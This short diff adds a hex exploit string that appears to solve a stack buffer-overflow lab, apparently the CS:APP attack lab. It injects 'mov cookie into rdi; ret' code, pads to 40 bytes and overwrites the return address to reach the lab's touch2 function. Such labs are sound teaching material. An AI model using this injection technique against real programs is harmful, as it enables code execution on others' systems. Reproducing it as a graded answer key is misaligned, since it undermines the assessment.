@@ -1,0 +1,11 @@
+/* Disassembly from cookie */
+48 c7 c7 bf 7b 92 76 c3
+/* Padding is 40 bytes including address */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* rsp - buffer size */
+68 fd 66 55 00 00 00 00
+/* address of touch2 */
+6a 15 40 00 00 00 00 00
